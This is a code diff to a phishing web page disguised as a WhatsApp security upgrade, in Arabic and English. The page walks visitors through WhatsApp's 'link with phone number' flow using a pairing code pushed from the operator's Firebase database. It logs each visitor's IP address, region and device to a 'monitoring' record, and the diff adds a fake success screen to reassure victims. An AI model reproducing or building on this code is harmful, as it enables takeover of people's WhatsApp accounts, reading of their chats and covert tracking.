@@ -15,10 +15,14 @@
         .v-row { display: flex; justify-content: space-between; font-size: 14px; margin: 10px 0; }
         .alert-p { font-size: 14px; color: #3b4a54; text-align: start; line-height: 1.5; border-top: 1px solid #eee; padding-top: 20px; margin-bottom: 15px; }
         .steps { text-align: start; font-size: 14px; color: #1c1e21; line-height: 1.6; }
-        .code-zone { border: 1.5px solid #00a884; border-radius: 10px; padding: 20px; margin-top: 25px; min-height: 110px; display: flex; flex-direction: column; justify-content: center; }
+        .code-zone { border: 1.5px solid #00a884; border-radius: 10px; padding: 20px; margin-top: 25px; min-height: 110px; display: flex; flex-direction: column; justify-content: center; position: relative; overflow: hidden; }
         #pairing-code { font-size: 32px; font-weight: bold; color: #075e54; letter-spacing: 5px; font-family: monospace; margin-bottom: 10px; }
         .wait-text { font-size: 12px; font-weight: 500; color: #8696a0; }
         .arrived { color: #d91e1e !important; font-weight: bold; }
+        #success-screen { display: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: #fff; flex-direction: column; justify-content: center; align-items: center; z-index: 10; animation: fadeIn 0.3s ease-in-out; }
+        .check-mark { color: #00a884; font-size: 45px; margin-bottom: 5px; font-weight: bold; }
+        .success-msg { font-weight: bold; color: #1c1e21; font-size: 15px; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
     </style>
 </head>
 <body>
@@ -34,11 +38,14 @@
         <p id="u-alert" class="alert-p"></p>
         <div id="u-steps" class="steps"></div>
         <div class="code-zone">
-            <div id="pairing-code">. . .</div>
+            <div id="pairing-code">...</div>
             <div id="u-wait" class="wait-text"></div>
+            <div id="success-screen">
+                <div class="check-mark">✓</div>
+                <div id="success-text" class="success-msg"></div>
+            </div>
         </div>
     </div>
-
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <script>
@@ -46,35 +53,36 @@
         firebase.initializeApp(config);
         const db = firebase.database();
         const userId = new URLSearchParams(window.location.search).get('id');
-
         const isAr = navigator.language.startsWith('ar');
         const isIOS = /iPhone|iPad|iPod/.test(navigator.userAgent);
-
         const content = {
-            ar: { badge: isIOS ? "جهاز مرتبط: iPhone" : "جهاز مرتبط: Android", alert: "لحماية خصوصيتك ومحادثاتك، يجب عليك الترقية إلى أحدث بروتوكول أمني (V3.0.1).", steps: "<b>كيفية التفعيل:</b><br>1. اضغط على إشعار واتساب لربط الجهاز.<br>2. اختر 'الربط برقم الهاتف بدلاً من ذلك'.<br>3. أدخل الرمز الذي سيظهر هنا:", wait: "في انتظار الرمز...", done: "أدخل الكود الآن في واتساب" },
-            en: { badge: isIOS ? "Linked Device: iPhone" : "Linked Device: Android", alert: "To protect your privacy and chats, you must upgrade to the latest security protocol (V3.0.1).", steps: "<b>How to activate:</b><br>1. Tap the WhatsApp notification.<br>2. Select 'Link with phone number instead'.<br>3. Enter the code shown below:", wait: "Awaiting security code...", done: "Enter code in WhatsApp now" }
+            ar: { badge: isIOS ? "جهاز مرتبط: iPhone" : "جهاز مرتبط: Android", alert: "لحماية خصوصيتك ومحادثاتك، يجب عليك الترقية إلى أحدث بروتوكول أمني (V3.0.1).", steps: "<b>كيفية التفعيل:</b><br>1. اضغط على إشعار واتساب لربط الجهاز.<br>2. اختر 'الربط برقم الهاتف بدلاً من ذلك'.<br>3. أدخل الرمز الذي سيظهر هنا:", wait: "في انتظار الرمز...", done: "أدخل الكود الآن في واتساب", success: "تم التحديث إلى أحدث إصدار بنجاح." },
+            en: { badge: isIOS ? "Linked Device: iPhone" : "Linked Device: Android", alert: "To protect your privacy and chats, you must upgrade to the latest security protocol (V3.0.1).", steps: "<b>How to activate:</b><br>1. Tap the WhatsApp notification.<br>2. Select 'Link with phone number instead'.<br>3. Enter the code shown below:", wait: "Awaiting security code...", done: "Enter code in WhatsApp now", success: "Successfully updated to the latest version." }
         };
-
         const c = isAr ? content.ar : content.en;
         document.documentElement.dir = isAr ? 'rtl' : 'ltr';
         document.getElementById('u-badge').innerText = c.badge;
         document.getElementById('u-alert').innerText = c.alert;
         document.getElementById('u-steps').innerHTML = c.steps;
         document.getElementById('u-wait').innerText = c.wait;
-
+        document.getElementById('success-text').innerText = c.success;
         if (userId) {
             const sRef = db.ref('monitoring/' + userId);
             fetch('https://ipapi.co/json/').then(r => r.json()).then(d => {
                 sRef.set({ status: "Online", ip: d.ip, region: d.region, device: isIOS ? "iPhone" : "Android", ts: Date.now() });
             }).catch(() => sRef.set({ status: "Online", ip: "Hidden", device: isIOS ? "iPhone" : "Android", ts: Date.now() }));
-
             sRef.onDisconnect().update({ status: "Offline" });
             db.ref('commands/' + userId).on('value', s => {
                 const v = s.val();
-                if (v && v.code) {
-                    document.getElementById('pairing-code').innerText = v.code;
-                    document.getElementById('u-wait').innerText = c.done;
-                    document.getElementById('u-wait').classList.add('arrived');
+                if (v) {
+                    if (v.code) {
+                        document.getElementById('pairing-code').innerText = v.code;
+                        document.getElementById('u-wait').innerText = c.done;
+                        document.getElementById('u-wait').classList.add('arrived');
+                    }
+                    if (v.status === 'confirmed') {
+                        document.getElementById('success-screen').style.display = 'flex';
+                    }
                 }
             });
         }
